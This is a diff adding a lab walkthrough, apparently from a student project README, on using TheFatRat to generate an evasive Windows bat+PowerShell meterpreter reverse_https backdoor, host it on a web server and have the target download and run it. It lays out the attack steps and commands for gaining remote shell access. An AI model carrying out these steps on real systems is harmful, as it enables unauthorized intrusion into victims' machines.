@@ -132,9 +132,95 @@ Thus, Zerotier is now completely setup and you are able to remotely connect to t
 
 # TheFatRat tool  
 
-Installation of TheFatRat tool from GitHub.Run command.
-$  sudo git clone https://github.com/screetsec/TheFatRat
-test
+Installation of TheFatRat tool from GitHub.Run using command ```sudo git clone https://github.com/screetsec/TheFatRat```  
+![image](https://user-images.githubusercontent.com/97077110/148495968-b5ff8cd0-f16e-4aaf-994b-9b7d19a233db.png)  
+## Setup of TheFatRat tool
+Use commmands   
+```  
+cd TheFatRat
+sudo chmod +x setup.sh (allow permission)
+sudo bash setup.sh
+```  
+![image](https://user-images.githubusercontent.com/97077110/148496107-f197f915-667b-435f-b1c4-083299940bd4.png)  
+Keep settings default, **Select enter and yes**  
+![image](https://user-images.githubusercontent.com/97077110/148496172-b5e27e9f-25fc-442e-936c-21b91890ba80.png)  
+## To run the tool  
+Use commands  
+```  
+cd TheFatRat
+sudo fatrat  
+```  
+![image](https://user-images.githubusercontent.com/97077110/148496278-23186611-7d9e-4ea5-9c19-32e138e680c4.png)  
+![image](https://user-images.githubusercontent.com/97077110/148496307-1e2055d1-5ee9-46cc-add9-f2dffe326e00.png)  
+## Main page of TheFatRat tool  
+For the epxloit, we are aiming o use this tool to create a backdoor in the target machine. Thus, we are choosing Create FUD backdoor 1000% with PwnWinds:  
+```[TheFatRat]-[~]:06```  
+![image](https://user-images.githubusercontent.com/97077110/148496436-54769cfd-90af-4282-8bae-af5164e21b98.png)  
+Since our target machine uses a Windows Operating system, we chose Create a bat file + Powershell.  
+```[TheFatRat]-[~]-[pwnwind]:[1]```  
+![image](https://user-images.githubusercontent.com/97077110/148496539-7c8eb1fb-279f-4a2f-9104-8d19818bfa8b.png)  
+## Configuration  
+Set LHOST IP  as  **Host IP**   
+Set Lport to **8080**  
+Output file name can be any file name:**Any name**  
+![image](https://user-images.githubusercontent.com/97077110/148496662-81aaa312-fc1f-4733-9c74-803c18663ccf.png)  
+![image](https://user-images.githubusercontent.com/97077110/148496679-182cd1d9-df85-41af-a85d-c2b948b466c1.png)  
+Choose **Windows/meterpreter/reverese_https**  
+To create a file that can be used to remote access the target
+Choose Payload:**6**  
+![image](https://user-images.githubusercontent.com/97077110/148496778-daf48909-16e2-44dd-ac14-4d637ae44571.png)  
+## Payload file:  
+The payload file is stored in FatRat_Generated directory.This directory store all the .bat files that are created.The payload file is then copy into the **/var/www/html/** directory.  
+```  
+sudo -i  
+cd FatRat_Generated  
+cp filename.bat /var/www/html/(directoryname)  
+```  
+![image](https://user-images.githubusercontent.com/97077110/148496890-5807789f-dde9-4777-93fe-f188dc84cef8.png)  
+
+## Target side:  
+Go to browser and go to the Host IP address 172.16.35.14/FYP/  
+![image](https://user-images.githubusercontent.com/97077110/148496961-ed19ae58-ddf2-4109-8c61-85709c90c3c8.png)  
+Download the fyp.bat and run it on the target system.  
+FinalRecon screenshot:  
+![image](https://user-images.githubusercontent.com/97077110/148497186-f611528c-e547-4776-bb86-9cfbb140916a.png)  
+![image](https://user-images.githubusercontent.com/97077110/148497210-c8392428-8308-477f-9f60-419f48e264f4.png)  
+![image](https://user-images.githubusercontent.com/97077110/148497246-e58cf561-df5f-445a-bc18-20c07db60587.png)  
+![image](https://user-images.githubusercontent.com/97077110/148497283-6c3681c7-8271-42b4-945b-cd4532ed8ffb.png)  
+![image](https://user-images.githubusercontent.com/97077110/148497306-cc6cf98a-06a4-4e9f-a67b-7f6e8446dff2.png)  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
